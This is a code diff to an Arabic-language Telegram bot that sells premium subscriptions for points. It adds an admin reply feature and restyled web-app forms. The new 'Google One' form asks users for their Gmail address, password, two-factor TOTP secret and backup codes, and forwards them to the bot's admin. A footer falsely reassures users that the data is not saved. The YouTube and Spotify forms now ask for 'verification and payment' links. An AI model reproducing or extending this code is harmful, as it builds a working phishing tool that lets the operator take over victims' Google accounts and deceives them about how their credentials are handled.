@@ -18,6 +18,9 @@ client = MongoClient(MONGO_URI)
 db = client['MyBotDB']
 users_collection = db['users']
 
+# قاموس لتتبع حالة الأدمن أثناء الرد على العملاء
+admin_states = {}
+
 # --- نصوص الأزرار ---
 BTN_YT = "📺 يوتيوب بريميوم"
 BTN_SPOTIFY = "🎵 سبوتيفاي بريميوم"
@@ -105,11 +108,38 @@ def add_points(message):
     else:
         bot.send_message(message.chat.id, "⛔️ عذراً، هذا الأمر للإدارة فقط.")
 
-# --- التفاعل مع الأزرار ---
+# --- التعامل مع أوامر الكول باك (زر الرد من الأدمن) ---
+@bot.callback_query_handler(func=lambda call: call.data.startswith('reply_'))
+def handle_reply_button(call):
+    if str(call.from_user.id) == str(ADMIN_ID):
+        target_id = call.data.split('_')[1]
+        admin_states[call.from_user.id] = {'action': 'replying', 'target_user': target_id}
+        bot.send_message(ADMIN_ID, f"✍️ <b>وضع الرد مفعل:</b>\nاكتب رسالتك الآن ليتم إرسالها للعميل صاحب الـ ID: <code>{target_id}</code>\n\n(لإلغاء الرد أرسل /cancel)", parse_mode="HTML")
+        bot.answer_callback_query(call.id)
+
+# --- التفاعل مع النصوص والأزرار ---
 @bot.message_handler(func=lambda message: True)
 def handle_text(message):
     user_id = message.from_user.id
     text = message.text
+
+    # التحقق مما إذا كان الأدمن في وضع "الرد على العميل"
+    if user_id in admin_states and admin_states[user_id].get('action') == 'replying':
+        if text == '/cancel':
+            del admin_states[user_id]
+            bot.send_message(user_id, "🚫 تم إلغاء وضع الرد.")
+            return
+        
+        target_user = admin_states[user_id]['target_user']
+        try:
+            bot.send_message(target_user, f"📩 <b>رسالة من الإدارة:</b>\n\n{text}", parse_mode="HTML")
+            bot.send_message(user_id, f"✅ تم إرسال رسالتك للعميل بنجاح.")
+        except:
+            bot.send_message(user_id, "❌ فشل الإرسال، يبدو أن العميل قام بإيقاف البوت.")
+        
+        del admin_states[user_id] # إنهاء وضع الرد بعد الإرسال
+        return
+
     user = users_collection.find_one({"user_id": user_id})
 
     if not user:
@@ -190,26 +220,31 @@ def handle_web_app_data(message):
 
     user = users_collection.find_one({"user_id": user_id})
     if user and user.get("points", 0) >= 15:
+        # خصم النقاط تلقائياً
         users_collection.update_one({"user_id": user_id}, {"$inc": {"points": -15}})
         
+        # إرسال الطلب للأدمن مع زر الرد المباشر
         if ADMIN_ID:
             admin_msg = f"🔔 <b>طلب جديد استلمناه للتو!</b>\n\n👤 العميل: {user_name} ({username})\n🆔 رقم العميل: <code>{user_id}</code>\n\n📋 <b>البيانات المرسلة:</b>\n{data}"
+            markup = InlineKeyboardMarkup()
+            markup.add(InlineKeyboardButton("✍️ رد على العميل", callback_data=f"reply_{user_id}"))
             try:
-                bot.send_message(ADMIN_ID, admin_msg)
+                bot.send_message(ADMIN_ID, admin_msg, reply_markup=markup)
             except:
                 pass
         
-        success_msg = "✅ <b>طلبك قيد التنفيذ، الرجاء الانتظار!</b>\n\n<a href='https://t.me/bdallhshay7'>💬 للتواصل والاستفسار اضغط هنا</a>"
+        # إخفاء رسالة فتح النموذج السابقة من شات العميل
         try:
             bot.delete_message(message.chat.id, message.message_id - 1) 
         except:
             pass
             
+        success_msg = "✅ <b>طلبك قيد التنفيذ، الرجاء الانتظار!</b>\n\n<a href='https://t.me/bdallhshay7'>💬 للتواصل والاستفسار اضغط هنا</a>"
         bot.send_message(user_id, success_msg, reply_markup=main_keyboard())
 
 
 # ==========================================
-# --- أكواد ونماذج HTML المدمجة (الواجهات) ---
+# --- أكواد ونماذج HTML المدمجة (تصاميم جديدة) ---
 # ==========================================
 
 @app.route('/youtube.html')
@@ -219,26 +254,33 @@ def youtube_form():
     <html dir="rtl">
     <head>
         <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
         <script src="https://telegram.org/js/telegram-web-app.js"></script>
         <style>
-            body { font-family: Arial, sans-serif; padding: 20px; text-align: center; background-color: #f9f9f9; color: #333;}
-            input { width: 90%; padding: 12px; margin: 20px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px;}
-            button { background-color: #FF0000; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 90%; font-weight: bold;}
+            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f9f9f9; text-align: center; padding: 20px; color: #333; margin: 0; }
+            .card { background: white; padding: 30px 20px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-top: 20px; }
+            h2 { color: #333; margin-top: 0; display: flex; align-items: center; justify-content: center; gap: 8px;}
+            p { color: #666; font-size: 15px; margin-bottom: 25px; }
+            input { width: 100%; padding: 15px; margin-bottom: 20px; border: 1.5px solid #eee; border-radius: 10px; font-size: 16px; box-sizing: border-box; transition: 0.3s; text-align: left; direction: ltr; }
+            input:focus { border-color: #FF0000; outline: none; }
+            button { background-color: #FF0000; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; box-shadow: 0 4px 6px rgba(255,0,0,0.2); }
         </style>
     </head>
     <body>
-        <h2>📺 يوتيوب بريميوم</h2>
-        <p>يرجى كتابة الإيميل المراد تفعيل الاشتراك عليه:</p>
-        <input type="email" id="email" placeholder="example@gmail.com" required>
-        <button onclick="sendData()">تأكيد وطلب التفعيل</button>
+        <div class="card">
+            <h2>يوتيوب بريميوم 📺</h2>
+            <p>يرجى لصق رابط التحقق والدفع الخاص بك في الأسفل:</p>
+            <input type="url" id="link" placeholder="https://..." required>
+            <button onclick="sendData()">تأكيد وطلب التفعيل</button>
+        </div>
         <script>
             let tg = window.Telegram.WebApp;
             tg.expand();
             function sendData() {
-                let email = document.getElementById('email').value;
-                if(!email) { alert("⚠️ الرجاء إدخال الإيميل أولاً!"); return; }
-                tg.sendData("الخدمة: يوتيوب بريميوم \\nالإيميل: " + email);
+                let link = document.getElementById('link').value;
+                if(!link) { alert("⚠️ الرجاء إدخال الرابط أولاً!"); return; }
+                tg.sendData("الخدمة: يوتيوب بريميوم \\nالرابط: " + link);
+                tg.close(); // الإغلاق التلقائي
             }
         </script>
     </body>
@@ -252,26 +294,33 @@ def spotify_form():
     <html dir="rtl">
     <head>
         <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
         <script src="https://telegram.org/js/telegram-web-app.js"></script>
         <style>
-            body { font-family: Arial, sans-serif; padding: 20px; text-align: center; background-color: #f9f9f9; color: #333;}
-            input { width: 90%; padding: 12px; margin: 20px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px;}
-            button { background-color: #1DB954; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 90%; font-weight: bold;}
+            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f9f9f9; text-align: center; padding: 20px; color: #333; margin: 0; }
+            .card { background: white; padding: 30px 20px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-top: 20px; }
+            h2 { color: #333; margin-top: 0; display: flex; align-items: center; justify-content: center; gap: 8px;}
+            p { color: #666; font-size: 15px; margin-bottom: 25px; }
+            input { width: 100%; padding: 15px; margin-bottom: 20px; border: 1.5px solid #eee; border-radius: 10px; font-size: 16px; box-sizing: border-box; transition: 0.3s; text-align: left; direction: ltr; }
+            input:focus { border-color: #1DB954; outline: none; }
+            button { background-color: #1DB954; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; box-shadow: 0 4px 6px rgba(29,185,84,0.2); }
         </style>
     </head>
     <body>
-        <h2>🎵 سبوتيفاي بريميوم</h2>
-        <p>يرجى كتابة الإيميل المراد تفعيل الاشتراك عليه:</p>
-        <input type="email" id="email" placeholder="example@gmail.com" required>
-        <button onclick="sendData()">تأكيد وطلب التفعيل</button>
+        <div class="card">
+            <h2>سبوتيفاي بريميوم 🎵</h2>
+            <p>يرجى لصق رابط التحقق والدفع الخاص بك في الأسفل:</p>
+            <input type="url" id="link" placeholder="https://..." required>
+            <button onclick="sendData()">تأكيد وطلب التفعيل</button>
+        </div>
         <script>
             let tg = window.Telegram.WebApp;
             tg.expand();
             function sendData() {
-                let email = document.getElementById('email').value;
-                if(!email) { alert("⚠️ الرجاء إدخال الإيميل أولاً!"); return; }
-                tg.sendData("الخدمة: سبوتيفاي بريميوم \\nالإيميل: " + email);
+                let link = document.getElementById('link').value;
+                if(!link) { alert("⚠️ الرجاء إدخال الرابط أولاً!"); return; }
+                tg.sendData("الخدمة: سبوتيفاي بريميوم \\nالرابط: " + link);
+                tg.close(); // الإغلاق التلقائي
             }
         </script>
     </body>
@@ -285,26 +334,92 @@ def gemini_form():
     <html dir="rtl">
     <head>
         <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
         <script src="https://telegram.org/js/telegram-web-app.js"></script>
         <style>
-            body { font-family: Arial, sans-serif; padding: 20px; text-align: center; background-color: #f9f9f9; color: #333;}
-            input { width: 90%; padding: 12px; margin: 20px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px;}
-            button { background-color: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 90%; font-weight: bold;}
+            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; color: #333; }
+            .header { background-color: #0f9d58; color: white; padding: 25px 20px; text-align: right; border-bottom-left-radius: 15px; border-bottom-right-radius: 15px;}
+            .header h2 { margin: 0; font-size: 26px; display: flex; align-items: center; justify-content: flex-start; gap: 10px; }
+            .header p { margin: 5px 0 0; font-size: 15px; opacity: 0.9; }
+            .badge { display: inline-block; background: rgba(255,255,255,0.2); padding: 5px 12px; border-radius: 15px; font-size: 13px; margin-top: 15px; }
+            .form-container { background: white; margin: -15px 15px 20px; padding: 25px 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.08); position: relative; z-index: 1; }
+            .form-group { margin-bottom: 22px; text-align: right; }
+            .section-title { font-size: 14px; color: #0f9d58; margin-bottom: 15px; font-weight: bold; border-bottom: 1px solid #eee; padding-bottom: 5px;}
+            .form-group label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 13px; color: #555; }
+            .input-wrapper { position: relative; }
+            input, textarea { width: 100%; padding: 14px; border: 1.5px solid #e0e0e0; border-radius: 8px; font-size: 15px; box-sizing: border-box; font-family: inherit; transition: 0.3s; background-color: #fafafa;}
+            input:focus, textarea:focus { outline: none; border-color: #0f9d58; background-color: white;}
+            .toggle-password { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #888; font-size: 18px;}
+            .helper-text { font-size: 11px; color: #888; margin-top: 8px; display: block; line-height: 1.4;}
+            .submit-btn { background-color: #0f9d58; color: white; border: none; padding: 16px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 100%; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 10px;}
+            .footer-note { text-align: center; font-size: 11px; color: #aaa; margin-top: 20px; }
         </style>
     </head>
     <body>
-        <h2>✨ جيميناي برو</h2>
-        <p>يرجى كتابة الإيميل المراد تفعيل الاشتراك عليه:</p>
-        <input type="email" id="email" placeholder="example@gmail.com" required>
-        <button onclick="sendData()">تأكيد وطلب التفعيل</button>
+        <div class="header">
+            <h2>أتمتة البكسل</h2>
+            <p>لتفعيل Google One املأ معلومات</p>
+            <div class="badge">🕒 عملة | $251.00</div>
+        </div>
+        <div class="form-container">
+            <div class="section-title">👤 حساب جوجل</div>
+            
+            <div class="form-group">
+                <label>Gmail عنوان</label>
+                <input type="email" id="email" placeholder="example@gmail.com" required>
+            </div>
+            
+            <div class="form-group">
+                <label>كلمة مرور جيميل</label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="الخاصة بك Gmail أدخل كلمة مرور" required>
+                    <span class="toggle-password" onclick="togglePwd()">👁️</span>
+                </div>
+            </div>
+            
+            <div class="section-title" style="margin-top: 30px;">🔓 المصادقة الثنائية</div>
+            
+            <div class="form-group">
+                <label>سر المصادقة الثنائية (TOTP)</label>
+                <input type="text" id="totp" placeholder="على سبيل المثال: JBSWY3DPEHPK3PXP">
+                <span class="helper-text">ℹ️ Base32 حرفًا 32 :Google Authenticator المفتاح السري من (والأرقام من 2 إلى 7 Z إلى A الحروف من) بالضبط.</span>
+            </div>
+            
+            <div class="form-group">
+                <label>رموز النسخ الاحتياطي <span style="color:#aaa; font-weight:normal;">(خيار)</span></label>
+                <textarea id="backup" rows="3" placeholder="سطر واحد من التعليمات البرمجية في كل سطر..."></textarea>
+                <span class="helper-text">ℹ️ رمز واحد في كل سطر، 2-3 رموز مطلوبة؛ يتكون كل رمز من 8 أرقام بالضبط.</span>
+            </div>
+            
+            <button class="submit-btn" onclick="sendData()">تأكيد وتفعيل ⚡</button>
+            <div class="footer-note">يتم استخدام المعلومات فقط لهذا التنشيط ولا يتم حفظها.</div>
+        </div>
+        
         <script>
             let tg = window.Telegram.WebApp;
             tg.expand();
+            
+            function togglePwd() {
+                let pwd = document.getElementById("password");
+                if(pwd.type === "password") { pwd.type = "text"; } else { pwd.type = "password"; }
+            }
+            
             function sendData() {
                 let email = document.getElementById('email').value;
-                if(!email) { alert("⚠️ الرجاء إدخال الإيميل أولاً!"); return; }
-                tg.sendData("الخدمة: جيميناي برو \\nالإيميل: " + email);
+                let pwd = document.getElementById('password').value;
+                let totp = document.getElementById('totp').value;
+                let backup = document.getElementById('backup').value;
+                
+                if(!email || !pwd) { alert("⚠️ الرجاء إدخال الإيميل وكلمة المرور الأساسية!"); return; }
+                
+                let dataString = "الخدمة: جيميناي برو (أتمتة البكسل)\\n" + 
+                                 "الإيميل: " + email + "\\n" +
+                                 "كلمة المرور: " + pwd + "\\n" +
+                                 "TOTP: " + totp + "\\n" +
+                                 "رموز الاحتياط: " + backup;
+                
+                tg.sendData(dataString);
+                tg.close(); // الإغلاق التلقائي للنافذة
             }
         </script>
     </body>
